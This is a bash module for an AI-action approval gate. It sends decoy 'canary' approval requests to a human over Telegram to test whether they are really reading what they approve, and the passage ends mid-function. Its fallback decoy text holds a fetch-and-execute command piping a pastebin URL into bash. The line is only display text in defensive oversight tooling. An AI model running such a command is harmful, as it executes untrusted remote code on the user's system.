#!/bin/bash
# canary.sh — Governance health probe for human-in-the-loop integrity
#
# The gate is structurally sound. The human link can degrade.
# Approval fatigue is real: latency drops from 15s to 3s as sessions
# progress. The human becomes a pass-through. The gate holds.
# The human doesn't.
#
# Canaries test whether the human is actually reading what they approve.
# Same principle as corporate phishing tests: employees know tests exist,
# they just don't know which email is the test.
#
# How it works:
#   1. After N approvals, the gate probabilistically sends a canary —
#      a fake dangerous-looking action — to Telegram
#   2. The canary looks identical to a real ask (plausible tool, rule, risk)
#   3. The described action is obviously dangerous (exfiltration, deletion, etc.)
#   4. If the human approves → fatigue detected → friction escalated
#   5. If the human denies → governance healthy → logged
#   6. After responding, Telegram reveals it was a governance test
#   7. The canary NEVER affects real tool calls — pure health probe
#
# Failure mode: if canary code crashes, the gate must not be affected.
# All canary functions are called behind || true guards in the gate.
#
# v3.3.6 — Cross-Session Canary Lifecycle
#   The trigger eligibility surface (counter, cooldown, pending lock) moved
#   from var/canary/{session_id}.canary.json to per-human state. A clean run
#   should earn future canary opportunity across sessions; the human is what
#   the system is calibrating, not the Claude session. The .pending file in
#   var/canary/{session_id}.canary.pending stays as a routing artifact so the
#   inbox handler keeps working — authoritative state lives in human state.
#
#   Demotion requires evidence, not absence of evidence. canary_failed and
#   canary_missed (artifact present, age > timeout, no callback) demote.
#   canary_pending_lost (state says pending, .pending file vanished) is a
#   bookkeeping fault; we clear, log internal warn, and never demote on it.

# ── Configuration (overridable via gate.json .canary) ──

CANARY_ENABLED="${ZLAR_CANARY_ENABLED:-true}"
CANARY_MIN_APPROVALS="${ZLAR_CANARY_MIN_APPROVALS:-5}"
CANARY_PROBABILITY="${ZLAR_CANARY_PROBABILITY:-20}"       # percent (0-100)
CANARY_COOLDOWN_S="${ZLAR_CANARY_COOLDOWN:-300}"           # min seconds between canaries
CANARY_STATE_DIR="${ZLAR_CANARY_STATE_DIR:-${PROJECT_DIR:-.}/var/canary}"
CANARY_SCENARIOS_FILE="${ZLAR_CANARY_SCENARIOS_FILE:-${PROJECT_DIR:-.}/etc/canary-scenarios.json}"
# v3.3.4 Clean Run Trust Lane Auto-Promotion. ZLAR does not score the human.
# It watches the run. A clean run earns speed; a broken run restores friction.
CANARY_CLEAN_RUN_PROMOTION_THRESHOLD="${ZLAR_CANARY_PROMOTION_THRESHOLD:-5}"
CANARY_AUTO_PROMOTION_ENABLED="${ZLAR_CANARY_AUTO_PROMOTION:-true}"
# v3.3.11 — Bounded recovery opportunity. After this many approvals since the
# last canary fire, force a canary trigger (bypasses probability dice only).
# Force respects pending_held / cooldown_active / cooldown_eval_error / chat_id —
# those are integrity, not luck. Default 0 = disabled; current behavior preserved.
# Misconfig where max <= min_approvals_before_trigger silently disables (the
# probability gate would always fire first below max anyway).
CANARY_MAX_APPROVALS_FORCE="${ZLAR_CANARY_MAX_APPROVALS_FORCE:-0}"
# Process-local trigger-reason marker. Set by canary_should_trigger when a fire
# decision is made; read by canary_send to thread into the artifact_payload and
# subsequent audit. Either "probability" or "forced_drought_ceiling".
CANARY_LAST_TRIGGER_REASON=""

# ── Initialization ──
# v3.3.6: also performs an orphan-pending sweep. A .pending file is "orphan" if
#   (a) its mtime is older than TELEGRAM_TIMEOUT_S (definitely stale), AND
#   (b) its canary id is not referenced by any live human state's
#       canary_pending_id (no live human is waiting on it).
# Both conditions required — narrow guard so we never delete a fresh pending
# whose human-state record hasn't yet been written, or a legitimate pending
# of a human we haven't loaded yet.

canary_init() {
    mkdir -p "${CANARY_STATE_DIR}" 2>/dev/null || true
    _canary_sweep_orphan_pending 2>/dev/null || true
}

_canary_sweep_orphan_pending() {
    [ -d "${CANARY_STATE_DIR}" ] || return 0
    local timeout_s="${TELEGRAM_TIMEOUT_S:-900}"
    local now_epoch
    now_epoch=$(date +%s)

    # Build the set of canary ids currently referenced by any human state.
    # State dir resolution mirrors lib/human-invariants.sh.
    local human_state_dir="${ZLAR_HUMAN_STATE_DIR:-${PROJECT_DIR:-.}/var/human-state}"
    local live_ids=""
    if [ -d "${human_state_dir}" ]; then
        local hsf
        for hsf in "${human_state_dir}"/*.json; do
            [ -f "${hsf}" ] || continue
            local _cid
            _cid=$(jq -r '.canary_pending_id // ""' "${hsf}" 2>/dev/null)
            [ -n "${_cid}" ] && live_ids="${live_ids}|${_cid}|"
        done
    fi

    local pf
    for pf in "${CANARY_STATE_DIR}"/*.canary.pending; do
        [ -f "${pf}" ] || continue
        local file_epoch age
        file_epoch=$(stat -c %Y "${pf}" 2>/dev/null || stat -f %m "${pf}" 2>/dev/null || echo 0)
        age=$((now_epoch - file_epoch))
        [ "${age}" -gt "${timeout_s}" ] || continue

        local cid
        cid=$(cat "${pf}" 2>/dev/null | tr -d '[:space:]')
        if [ -n "${cid}" ] && [ -n "${live_ids}" ]; then
            case "${live_ids}" in
                *"|${cid}|"*) continue ;;  # live human waiting on this — leave alone
            esac
        fi

        rm -f "${pf}" 2>/dev/null
        if type log &>/dev/null; then
            log "CANARY: orphan-pending swept ${pf##*/} (age=${age}s, cid=${cid:-empty})"
        fi
    done
}

# ── Load config from gate.json ──

canary_load_config() {
    # v3.3.11 — every optional-key read uses an explicit `if` block. The older
    # `[ -n "$_v" ] && X="$_v"` shorthand returns the test's exit code (1 when
    # the key is absent), and bash `set -e` propagates that out of the
    # function — fatal to gate hooks that source this file. The pattern was
    # latently safe pre-v3.3.11 only because every key documented above
    # happened to be present on the maintainer's box. The trailing
    # `return 0` is belt-and-braces against future-author churn.
    local gate_config="${1:-${PROJECT_DIR:-.}/etc/gate.json}"
    if [ -f "${gate_config}" ] && command -v jq &>/dev/null; then
        local _v
        _v=$(jq -r '.canary.enabled // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_ENABLED="${_v}"
        fi
        _v=$(jq -r '.canary.min_approvals_before_trigger // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_MIN_APPROVALS="${_v}"
        fi
        _v=$(jq -r '.canary.probability_percent // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_PROBABILITY="${_v}"
        fi
        _v=$(jq -r '.canary.cooldown_s // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_COOLDOWN_S="${_v}"
        fi
        _v=$(jq -r '.canary.scenarios_file // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_SCENARIOS_FILE="${PROJECT_DIR:-.}/${_v}"
        fi
        _v=$(jq -r '.canary.clean_run_promotion_threshold // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_CLEAN_RUN_PROMOTION_THRESHOLD="${_v}"
        fi
        _v=$(jq -r '.canary.auto_promotion_enabled // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_AUTO_PROMOTION_ENABLED="${_v}"
        fi
        _v=$(jq -r '.canary.max_approvals_before_forced_canary // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${_v}" ]; then
            CANARY_MAX_APPROVALS_FORCE="${_v}"
        fi
    fi
    return 0
}

# v3.3.7 Canary Evidence Hardening — chat_id source detection.
#
# bin/zlar-gate currently falls back to a hardcoded chat_id at line 509 if
# gate.json doesn't carry .telegram.chat_id and no env override is set.
# That fallback inherits into TELEGRAM_CHAT_ID for any sourced module,
# including this file, and on a misdeployed non-maintainer box it routes
# every canary to the maintainer's Telegram. We cannot detect the
# fallback by examining TELEGRAM_CHAT_ID alone — the value is identical.
# Instead, we read gate.json directly and check for the explicit field.
#
# Returns one of: "gate.json" | "env" | "hardcoded-fallback" | "unconfigured"
_canary_chat_id_source() {
    local gate_config="${PROJECT_DIR:-.}/etc/gate.json"
    if [ -f "${gate_config}" ] && command -v jq &>/dev/null; then
        local cfg
        cfg=$(jq -r '.telegram.chat_id // empty' "${gate_config}" 2>/dev/null)
        if [ -n "${cfg}" ]; then
            echo "gate.json"
            return 0
        fi
    fi
    if [ -n "${ZLAR_TELEGRAM_CHAT_ID:-}" ]; then
        echo "env"
        return 0
    fi
    if [ -n "${TELEGRAM_CHAT_ID:-}" ]; then
        # Non-empty TELEGRAM_CHAT_ID without gate.json or env override means
        # the bin/zlar-gate hardcoded fallback at line 509 supplied the value.
        echo "hardcoded-fallback"
        return 0
    fi
    echo "unconfigured"
    return 0
}

# Returns 0 if chat_id source is acceptable for sending canaries
# (gate.json or env), 1 otherwise. Audit-emits canary_subsystem_misconfigured
# the first time per process if the source is bad.
_CANARY_MISCONFIG_LOGGED=""
_canary_chat_id_validate() {
    local source
    source=$(_canary_chat_id_source)
    case "${source}" in
        gate.json|env)
            return 0
            ;;
        *)
            if [ -z "${_CANARY_MISCONFIG_LOGGED}" ]; then
                _CANARY_MISCONFIG_LOGGED="1"
                if type log &>/dev/null; then
                    log "CANARY: chat_id source is '${source}' — refusing to send canaries"
                fi
                if type emit_event &>/dev/null; then
                    emit_event "canary" "canary_subsystem_misconfigured" "warn" \
                        "$(jq -n -c --arg src "${source}" \
                            '{chat_id_source:$src,reason:"non_authoritative_source"}')" \
                        "canary" "warn" 0 "canary"
                fi
            fi
            return 1
            ;;
    esac
}

# ── Record a human approval (increment per-human counter) ──
# v3.3.6: counter is per-human, not per-session. session_id retained as
# first arg only for back-compat at existing call sites — its value is
# unused. If human_id is empty (legacy callers / tests without identity),
# no-op silently rather than fail.

canary_record_approval() {
    local session_id="${1:-}"   # accepted but unused — back-compat
    # v3.3.6 back-compat: existing bin/zlar-gate (R041-protected) calls these
    # functions with just session_id. Fall back to the gate's TELEGRAM_CHAT_ID
    # global so the bash gate keeps working without an enforcement-layer edit.
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"

    [ "${CANARY_ENABLED}" = "true" ] || return 0
    [ -n "${human_id}" ] || return 0

    if type hi_record_canary_approval &>/dev/null; then
        hi_record_canary_approval "${human_id}" 2>/dev/null || true
    fi
}

# ── Should we send a canary for this human? ──
# Returns 0 if yes, 1 if no.
# v3.3.6: trigger eligibility (counter, cooldown, per-human pending lock)
# evaluated against per-human state via hi_canary_should_trigger.
# Probability gate stays here so the canary subsystem owns its own randomness.

canary_should_trigger() {
    local session_id="${1:-}"   # accepted but unused — back-compat
    # v3.3.6 back-compat: existing bin/zlar-gate (R041-protected) calls these
    # functions with just session_id. Fall back to the gate's TELEGRAM_CHAT_ID
    # global so the bash gate keeps working without an enforcement-layer edit.
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"

    # Reset trigger-reason marker every call. Set on fire, read by canary_send.
    CANARY_LAST_TRIGGER_REASON=""

    [ "${CANARY_ENABLED}" = "true" ] || return 1
    [ -n "${human_id}" ] || return 1

    type hi_canary_should_trigger &>/dev/null || return 1
    hi_canary_should_trigger "${human_id}" "${CANARY_MIN_APPROVALS}" "${CANARY_COOLDOWN_S}" || return 1

    # v3.3.11 — Bounded recovery opportunity (forced canary ceiling).
    #
    # If the human has accumulated more approvals since the last canary fire
    # than the configured ceiling, bypass the probability dice. This bounds
    # friction-without-recovery to a known maximum — the system cannot pay
    # its own dice failures (or any future trigger-path bug) out of the
    # human's labor indefinitely. D2 axiom: friction(h, t) ⟹ Evidence(h, t).
    #
    # Force respects every structural eligibility check:
    #   pending_held / cooldown_active / cooldown_eval_error → enforced above
    #     by hi_canary_should_trigger (we only reach here if those passed).
    #   chat_id validation → enforced downstream in canary_send.
    # Only the probability dice gets bypassed — structural eligibility is
    # integrity, not luck.
    #
    # Misconfig handling: non-numeric or zero CANARY_MAX_APPROVALS_FORCE → no
    # force (current v3.3.10 behavior preserved). max <= min_approvals → silent
    # no-op (probability gate would have fired below max; force is unreachable).
    local force_ceiling="${CANARY_MAX_APPROVALS_FORCE:-0}"
    case "${force_ceiling}" in ''|*[!0-9]*) force_ceiling=0 ;; esac
    if [ "${force_ceiling}" -gt 0 ] && [ "${force_ceiling}" -gt "${CANARY_MIN_APPROVALS}" ]; then
        # Resolve state file via _hi_ensure_state so we inherit the canonical
        # path resolution used everywhere else in human-invariants.sh
        # (_HI_PROJECT_DIR / ZLAR_HUMAN_STATE_DIR / PROJECT_DIR fallbacks).
        # _hi_ensure_state is idempotent — no side effects on existing state.
        local approvals_now state_file
        state_file=""
        if type _hi_ensure_state &>/dev/null; then
            state_file=$(_hi_ensure_state "${human_id}" 2>/dev/null) || state_file=""
        fi
        if [ -n "${state_file}" ] && [ -f "${state_file}" ]; then
            approvals_now=$(jq -r '.canary_approvals_since_last // 0 | floor' "${state_file}" 2>/dev/null || echo 0)
        else
            approvals_now=0
        fi
        case "${approvals_now}" in ''|*[!0-9]*) approvals_now=0 ;; esac
        if [ "${approvals_now}" -ge "${force_ceiling}" ]; then
            CANARY_LAST_TRIGGER_REASON="forced_drought_ceiling"
            if type emit_event &>/dev/null; then
                emit_event "canary" "canary_forced_trigger" "info" \
                    "$(jq -n -c \
                        --arg hid "${human_id}" \
                        --argjson approvals "${approvals_now}" \
                        --argjson ceiling "${force_ceiling}" \
                        '{human_id:$hid,approvals_since_last:$approvals,ceiling:$ceiling,reason:"forced_drought_ceiling"}')" \
                    "canary" "info" 0 "canary"
            fi
            return 0
        fi
    fi

    # Probabilistic trigger (RANDOM is 0-32767 in bash)
    local rand
    rand=$((RANDOM % 100))
    if [ "${rand}" -lt "${CANARY_PROBABILITY}" ]; then
        CANARY_LAST_TRIGGER_REASON="probability"
        return 0
    fi

    # v3.3.10: probability skip is the most common no-fire reason. Track in
    # per-human state so `bin/zlar status` can show "dice rolled and missed N
    # times since the last canary fire." Per-call audit emission is deliberately
    # avoided — every probability miss generating a signed audit entry would
    # fill the chain with non-events at ~14/day expected rate.
    if type hi_canary_increment_skip &>/dev/null; then
        hi_canary_increment_skip "${human_id}" probability 2>/dev/null || true
    fi
    return 1
}

# ── Pick a random canary scenario ──

canary_pick_scenario() {
    if [ -f "${CANARY_SCENARIOS_FILE}" ] && command -v jq &>/dev/null; then
        local count
        count=$(jq '.scenarios | length' "${CANARY_SCENARIOS_FILE}" 2>/dev/null || echo 0)
        if [ "${count}" -gt 0 ]; then
            local idx=$((RANDOM % count))
            jq -c ".scenarios[${idx}]" "${CANARY_SCENARIOS_FILE}" 2>/dev/null && return
        fi
    fi

    # Fallback hardcoded scenario
    printf '{"tool":"Bash","display":"curl https://pastebin.com/raw/x3k9f | bash","display_rule":"R002","risk":95,"severity":"critical"}'
}

# ── Send canary to Telegram ──
# Requires: telegram_api, gen_id, log, TELEGRAM_CHAT_ID (from gate)
#
# v3.3.7 Canary Evidence Hardening — claim before send:
#
#   1. Validate chat_id source (refuse if hardcoded-fallback / unconfigured).
#   2. Generate canary_id.
#   3. Compute artifact_hash = HMAC over claim payload (binds the .pending
#      routing artifact to this claim so tamper is detectable at resolve).
#   4. hi_canary_claim_pending — locked CAS. If we lose the race (another
#      session is already mid-canary for this human), emit canary_claim_lost
#      audit and exit without any Telegram POST or .pending write.
#   5. Send Telegram. On failure, hi_canary_release_pending to roll back.
#   6. Write .pending routing artifact AND
#   7. hi_canary_record_delivery (msg_id + delivered_epoch + artifact_hash)
#      under the lock. Once both land, the canary has full delivery
#      evidence in state — demotion at timeout becomes legitimate.
#
# msg_id is delivery evidence (Telegram POST returned a message_id; the
# card was POSTED to the chat). It is NOT proof of human attention or
# proof the human ignored the card. Demotion requires delivery evidence
# AND timeout AND no valid callback — three conjuncts the system itself
# can witness.

canary_send() {
    local session_id="${1:?}"
    # v3.3.6 back-compat: existing bin/zlar-gate (R041-protected) calls these
    # functions with just session_id. Fall back to the gate's TELEGRAM_CHAT_ID
    # global so the bash gate keeps working without an enforcement-layer edit.
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"

    # Fail-safe: if human_id cannot be resolved we cannot govern this canary
    # (no per-human pending lock, no lane to update on result). Do NOT send.
    # Demotion requires evidence; an ungovernable canary cannot produce evidence.
    if [ -z "${human_id}" ]; then
        log "CANARY: human_id unresolved — not sending (fail-safe; no trigger / no send / no demotion)"
        return 0
    fi

    # v3.3.7 A3: refuse to send if chat_id source is non-authoritative
    # (hardcoded-fallback inherited from bin/zlar-gate:509, or unconfigured).
    # Audit emitted once per process by _canary_chat_id_validate.
    if ! _canary_chat_id_validate; then
        return 0
    fi

    local scenario
    scenario=$(canary_pick_scenario)
    local tool display display_rule risk severity
    tool=$(echo "${scenario}" | jq -r '.tool // "Bash"' 2>/dev/null)
    display=$(echo "${scenario}" | jq -r '.display // "unknown"' 2>/dev/null)
    display_rule=$(echo "${scenario}" | jq -r '.display_rule // "R002"' 2>/dev/null)
    risk=$(echo "${scenario}" | jq -r '.risk // 95' 2>/dev/null)
    severity=$(echo "${scenario}" | jq -r '.severity // "critical"' 2>/dev/null)

    local canary_id
    canary_id=$(gen_id)

    # v3.3.7 A2: artifact_hash binds the .pending routing artifact to this
    # claim. canonical(payload) | _state_hmac_compute "${_HI_HMAC_KEY}".
    # Artifact contents = canary_id (existing format); the hash is stored
    # in human state alongside msg_id so a tampered or replaced .pending
    # file fails verification at resolve time.
    #
    # v3.3.11: trigger_reason is included in the hashed payload so a tampered
    # "forced_drought_ceiling → probability" relabel (which would let an
    # attacker hide the system's accumulated debt to the human) invalidates
    # the claim hash. Default "probability" preserves the v3.3.10 hash shape
    # whenever canary_send is invoked from a path that did not set the marker.
    local trigger_reason="${CANARY_LAST_TRIGGER_REASON:-probability}"
    local artifact_payload artifact_hash
    artifact_payload=$(jq -n -c \
        --arg cid "${canary_id}" \
        --arg hid "${human_id}" \
        --arg sid "${session_id}" \
        --arg reason "${trigger_reason}" \
        '{canary_id:$cid,human_id:$hid,session_id:$sid,trigger_reason:$reason}')
    artifact_hash=$(printf '%s' "${artifact_payload}" | _state_hmac_compute "${_HI_HMAC_KEY:-}")

    # v3.3.7 A1: locked CAS. If another session already holds the per-human
    # pending claim, we exit without Telegram POST or .pending write.
    if type hi_canary_claim_pending &>/dev/null; then
        if ! hi_canary_claim_pending "${human_id}" "${canary_id}" "${session_id}" 2>/dev/null; then
            log "CANARY: claim race lost for human ${human_id} (canary ${canary_id} not sent)"
            if type emit_event &>/dev/null; then
                emit_event "canary" "canary_claim_lost" "info" \
                    "$(jq -n -c --arg cid "${canary_id}" --arg sid "${session_id}" --arg hid "${human_id}" \
                        '{canary_id:$cid,session_id:$sid,human_id:$hid,reason:"another_session_claimed_first"}')" \
                    "canary" "info" 0 "canary"
            fi
            return 0
        fi
    fi

    # Emoji matches real asks — canary must be indistinguishable
    local emoji="🔴"
    [ "${severity}" = "warn" ] && emoji="🟡"

    local text="${emoji} 🖥️ *ZLAR Gate*

*Tool:* \`${tool}\`
*Action:* \`${display}\`
*Risk:* ${risk}/100
*Rule:* ${display_rule}
*Session:* \`${session_id}\`"

    # MarkdownV2 escaping (same as gate's telegram_ask_async)
    text=$(echo "${text}" | sed 's/[_\[\]()~>#+=|{}.!-]/\\&/g' | sed 's/\\`/`/g' | sed 's/\\\*/*/g')

    local keyboard
    keyboard=$(jq -n -c \
        --arg aid "${canary_id}" \
        '{inline_keyboard: [[
            {text: "✅ Approve", callback_data: ("cc:canary:approve:" + $aid)},
            {text: "❌ Deny", callback_data: ("cc:canary:deny:" + $aid)}
        ]]}')

    local send_body
    send_body=$(jq -n -c \
        --arg chat_id "${TELEGRAM_CHAT_ID}" \
        --arg text "${text}" \
        --argjson reply_markup "${keyboard}" \
        '{chat_id: $chat_id, text: $text, parse_mode: "MarkdownV2", reply_markup: $reply_markup}')

    local send_result
    send_result=$(telegram_api "sendMessage" "${send_body}")

    local msg_id
    msg_id=$(echo "${send_result}" | jq -r '.result.message_id // empty' 2>/dev/null)

    if [ -z "${msg_id}" ]; then
        log "CANARY: Failed to send canary message: ${send_result}"
        # Roll back the claim — no delivery evidence will ever land.
        if type hi_canary_release_pending &>/dev/null; then
            hi_canary_release_pending "${human_id}" "${canary_id}" 2>/dev/null || true
        fi
        return 1
    fi

    # Write the routing artifact (per-session). The artifact is now a
    # routing hint only — the authoritative discriminator at resolve time
    # is state.canary_pending_msg_id (delivery evidence) plus the
    # artifact_hash check against the file's canonicalized contents.
    canary_init
    printf '%s\n' "${canary_id}" > "${CANARY_STATE_DIR}/${session_id}.canary.pending" 2>/dev/null

    # Record delivery evidence under the per-human lock. If this fails
    # (claim resolved during Telegram call, vanishingly rare), the
    # canary becomes pending_lost on next resolve — fail-safe path.
    if type hi_canary_record_delivery &>/dev/null; then
        hi_canary_record_delivery "${human_id}" "${canary_id}" "${msg_id}" "${artifact_hash}" 2>/dev/null || true
    fi

    log "CANARY: Sent ${canary_id} for human ${human_id:-?} (session ${session_id}, msg_id ${msg_id})"
    return 0
}

# ── Check for canary callback result in inbox ──
# v3.3.6: keyed on human_id. Reads the pending session from human state to
# locate the routing artifact. This is the cross-session fix: a canary fired
# in session A can be resolved by any later gate invocation under the same
# human, in any session. session_id is no longer needed by this function.
#
# Outcomes:
#   approve callback → canary_failed (fatigue) → demote
#   deny    callback → canary_passed (healthy) → may promote
#   stale + artifact present → canary_missed → demote
#   pending recorded but artifact missing → canary_pending_lost → clear, no demote
#
# Demotion requires evidence, not absence of evidence. A missing artifact is
# a bookkeeping loss, not a human miss.

canary_check_result() {
    # v3.3.6 back-compat: bin/zlar-gate calls canary_check_result <session_id> <human_id>.
    # Pre-v3.3.6 the function was keyed on session_id; v3.3.6 keys on human_id.
    # We accept the old call shape, ignore arg1, and use arg2 — preserves bash
    # gate compatibility without editing the R041-protected enforcement-layer
    # binary. Fall back to ${TELEGRAM_CHAT_ID:-} so single-arg callers (or
    # tests using the gate's globals) still resolve a human_id.
    local _ignored_session_id="${1:-}"
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"
    [ -n "${human_id}" ] || return 0

    type hi_canary_get_pending_id &>/dev/null || return 0

    local canary_id pending_session
    canary_id=$(hi_canary_get_pending_id "${human_id}" 2>/dev/null)
    [ -n "${canary_id}" ] || return 0  # nothing outstanding for this human

    pending_session=$(hi_canary_get_pending_session "${human_id}" 2>/dev/null)
    local pending_file=""
    if [ -n "${pending_session}" ]; then
        pending_file="${CANARY_STATE_DIR}/${pending_session}.canary.pending"
    fi

    # Process callback inbox if present.
    local inbox_dir="/var/run/zlar-tg/inbox/cc"
    if [ -d "${inbox_dir}" ]; then
        local cb_file
        for cb_file in "${inbox_dir}"/*.json; do
            [ -f "${cb_file}" ] || continue
            local cb_data cb_from cb_id_field cb_hmac
            cb_data=$(jq -r '.data // ""' "${cb_file}" 2>/dev/null)
            cb_from=$(jq -r '.from_id // ""' "${cb_file}" 2>/dev/null)
            cb_id_field=$(jq -r '.callback_query_id // ""' "${cb_file}" 2>/dev/null)
            cb_hmac=$(jq -r '.hmac // ""' "${cb_file}" 2>/dev/null)

            case "${cb_data}" in
                cc:canary:*) ;;
                *) continue ;;
            esac

            if [ "${cb_from}" != "${TELEGRAM_CHAT_ID}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                continue
            fi

            if ! zlar_hmac_verify "${cb_data}" "${cb_from}" "${cb_id_field}" "${cb_hmac}"; then
                log "CANARY: HMAC mismatch for canary callback — discarding"
                rm -f "${cb_file}" 2>/dev/null
                continue
            fi

            if [ "${cb_data}" = "cc:canary:approve:${canary_id}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                [ -n "${pending_file}" ] && rm -f "${pending_file}" 2>/dev/null
                _canary_log_fatigue "${pending_session}" "${canary_id}" "${human_id}"
                return 0
            elif [ "${cb_data}" = "cc:canary:deny:${canary_id}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                [ -n "${pending_file}" ] && rm -f "${pending_file}" 2>/dev/null
                _canary_log_healthy "${pending_session}" "${canary_id}" "${human_id}"
                return 0
            fi
        done
    fi

    # v3.3.7 Canary Evidence Hardening — msg_id-anchored discriminator.
    #
    # No callback matched. Read delivery evidence and decide.
    # Demotion requires ALL THREE: delivery evidence + timeout + no callback.
    # msg_id is delivery/posting evidence (Telegram POST returned a
    # message_id). It is NOT proof of human attention.
    local pending_msg_id started now_epoch age
    pending_msg_id=$(hi_canary_get_pending_msg_id "${human_id}" 2>/dev/null || echo "")
    started=$(hi_canary_get_pending_started "${human_id}" 2>/dev/null || echo 0)
    # v3.3.10: defensive guard against any non-integer that slips past
    # hi_canary_get_pending_started's `| floor` cast (e.g., jq missing on a
    # bare-bones operator system, or a partial write under crash). "0" treats
    # the canary as not-started — falls through to msg_id checks safely.
    case "${started}" in ''|*[!0-9]*) started=0 ;; esac
    now_epoch=$(date +%s)
    age=$((now_epoch - started))

    # Still in flight — never judge before the timeout, regardless of state.
    if [ "${started}" -gt 0 ] && [ "${age}" -le "${TELEGRAM_TIMEOUT_S:-900}" ]; then
        return 0
    fi

    if [ -z "${pending_msg_id}" ]; then
        # No delivery evidence — claim succeeded but Telegram POST never
        # confirmed (rare partial-write between claim and record_delivery).
        # Bookkeeping fault, not a human miss. Clear, no demote.
        if [ "${started}" -gt 0 ]; then
            _canary_log_pending_lost "${pending_session}" "${canary_id}" "${human_id}"
        fi
        return 0
    fi

    # Delivery evidence exists. Inspect the routing artifact.
    if [ -n "${pending_file}" ] && [ -f "${pending_file}" ]; then
        local file_canary
        file_canary=$(cat "${pending_file}" 2>/dev/null | tr -d '[:space:]')
        if [ "${file_canary}" = "${canary_id}" ]; then
            # Delivery evidence + intact artifact + timeout + no callback.
            # System-observable miss. Demote.
            rm -f "${pending_file}" 2>/dev/null
            _canary_log_expired "${pending_session}" "${canary_id}" "${human_id}"
        else
            # Delivery evidence exists but the artifact's contents do not
            # match the canary we issued. Cannot rule out attacker
            # corruption of our own bookkeeping. "Tampered evidence is
            # not delivery evidence we can act on." Clear, no demote.
            rm -f "${pending_file}" 2>/dev/null
            _canary_log_pending_tampered "${pending_session}" "${canary_id}" "${human_id}" "${file_canary}"
        fi
    else
        # Delivery evidence exists, artifact missing. The .pending file is
        # not authoritative in v3.3.7 — its absence does not exonerate the
        # timeout. Demote, with an additional audit event so operators can
        # correlate destroyed-bookkeeping with the demotion.
        if type emit_event &>/dev/null; then
            emit_event "canary" "canary_artifact_destroyed_post_delivery" "warn" \
                "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" --arg hid "${human_id}" --arg mid "${pending_msg_id}" \
                    '{canary_id:$cid,session_id:$sid,human_id:$hid,msg_id:$mid,note:"artifact_missing_but_delivery_proven"}')" \
                "canary" "warn" 0 "canary"
        fi
        _canary_log_expired "${pending_session}" "${canary_id}" "${human_id}"
    fi

    return 0
}

# ── Legacy fatigue helpers (v3.3.4 deprecated, v3.3.6 inert) ──
# Kept exported for any external operator script that may still call them.
# Pre-v3.3.6 these read .canary.json session-state files; that surface is
# no longer maintained. They now return safe defaults (not-fatigued, count=0)
# so callers degrade gracefully without erroring.

canary_is_fatigued() {
    return 1   # not fatigued (per-human signal is now clean_run_count via Trust Lane)
}

canary_fatigue_count() {
    echo "0"
}

# ── Internal logging functions ──
# pending_session is the session that issued the canary (may be empty if
# routing was lost). canary_id and human_id are required.

_canary_log_fatigue() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY FAILED: human ${human_id} approved canary ${canary_id} — FATIGUE DETECTED"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "fatigue_detected" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" \
                '{canary_id:$cid,session_id:$sid,result:"fatigue_detected"}')" \
            "canary" "warn" 0 "canary"
    fi

    # v3.3.4: clean run resets, lane demotes. v3.3.6: pending-state cleared
    # via the same code path through hi_canary_clear_pending below.
    if type hi_record_canary_outcome &>/dev/null; then
        local _crun_action
        _crun_action=$(hi_record_canary_outcome "${human_id}" "failed" \
            "${CANARY_CLEAN_RUN_PROMOTION_THRESHOLD}" "${CANARY_AUTO_PROMOTION_ENABLED}" 2>/dev/null || true)
        if [ "${_crun_action#demoted:}" != "${_crun_action}" ] && type emit_event &>/dev/null; then
            emit_event "canary" "trust_lane_demoted" "logged" \
                "$(jq -n -c --arg cid "${canary_id}" --arg act "${_crun_action}" \
                    '{canary_id:$cid,transition:$act,clean_run_reset:true}')" \
                "canary" "warn" 0 "canary"
        fi
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

_canary_log_healthy() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY PASSED: human ${human_id} correctly denied canary ${canary_id}"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "healthy" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" \
                '{canary_id:$cid,session_id:$sid,result:"healthy"}')" \
            "canary" "info" 0 "canary"
    fi

    if type hi_record_canary_outcome &>/dev/null; then
        local _crun_action
        _crun_action=$(hi_record_canary_outcome "${human_id}" "passed" \
            "${CANARY_CLEAN_RUN_PROMOTION_THRESHOLD}" "${CANARY_AUTO_PROMOTION_ENABLED}" 2>/dev/null || true)
        if [ "${_crun_action#promoted:}" != "${_crun_action}" ] && type emit_event &>/dev/null; then
            emit_event "canary" "trust_lane_auto_promoted" "logged" \
                "$(jq -n -c --arg cid "${canary_id}" --arg act "${_crun_action}" \
                    '{canary_id:$cid,transition:$act}')" \
                "canary" "info" 0 "canary"
        fi
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

_canary_log_expired() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY EXPIRED: human ${human_id} canary ${canary_id} — no response"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "expired" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" \
